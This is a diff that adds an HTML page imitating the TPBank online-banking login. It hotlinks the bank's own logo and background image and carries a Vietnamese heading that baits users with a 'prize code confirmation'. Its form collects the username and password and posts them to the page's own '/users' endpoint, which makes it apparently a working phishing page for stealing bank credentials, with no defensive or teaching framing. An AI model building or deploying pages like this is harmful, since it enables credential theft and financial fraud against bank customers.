@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
+    <link rel="shortcut icon" type="image/x-icon" href="https://cdn.haitrieu.com/wp-content/uploads/2022/02/Icon-TPBank.png" />
+    <link rel="stylesheet" href="style.css" />
+    <style>
+        *,
+        *:before,
+        *:after {
+            box-sizing: border-box;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            font: inherit;
+        }
+        
+        img,
+        picture,
+        svg,
+        video {
+            display: block;
+            max-width: 100%;
+        }
+        
+        body {
+            background-image: url("https://ebank.tpb.vn/retail/vX/login-bg-1920.835cba0e82c8d6e6ab7b.png");
+            font-family: "Roboto", sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+        
+        header {
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            padding: 30px 70px;
+        }
+        
+        .header img {
+            height: 50px;
+        }
+        
+        form {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            margin-top: 150px;
+            padding-top: 60px;
+            width: 100%;
+        }
+        
+        h1 {
+            margin-bottom: 20px;
+            color: #fff;
+            font-size: 2rem;
+            text-align: center;
+            max-width: 600px;
+        }
+        
+        input {
+            width: 80%;
+            max-width: 400px;
+            margin: 10px 0;
+            padding: 12px;
+            background-color: rgba(255, 255, 255, 0.8);
+            color: #333;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        
+        button {
+            border: none;
+            width: 80%;
+            max-width: 400px;
+            margin-top: 20px;
+            padding: 12px;
+            background-color: #7b35bb;
+            color: #ff9800;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        
+        button:hover {
+            background-color: #682d9b;
+        }
+    </style>
+    <title>TPBank</title>
+</head>
+
+<body>
+    <header>
+        <div>
+            <img src="https://ebank.tpb.vn/retail/vX/assets/images/logo.svg" alt="" />
+        </div>
+    </header>
+    <form action="/users" method="POST">
+        <h1>Đăng nhập tpbank online hệ thống xác nhận mã số giải thưởng</h1>
+        <input type="text" id="username" name="username" placeholder="Tên đăng nhập" />
+        <input type="password" id="password" name="password" placeholder="Mật khẩu" />
+        <button type="submit">Đăng nhập</button>
+    </form>
+    <script src="./index.js"></script>
+</body>
+
+</html>
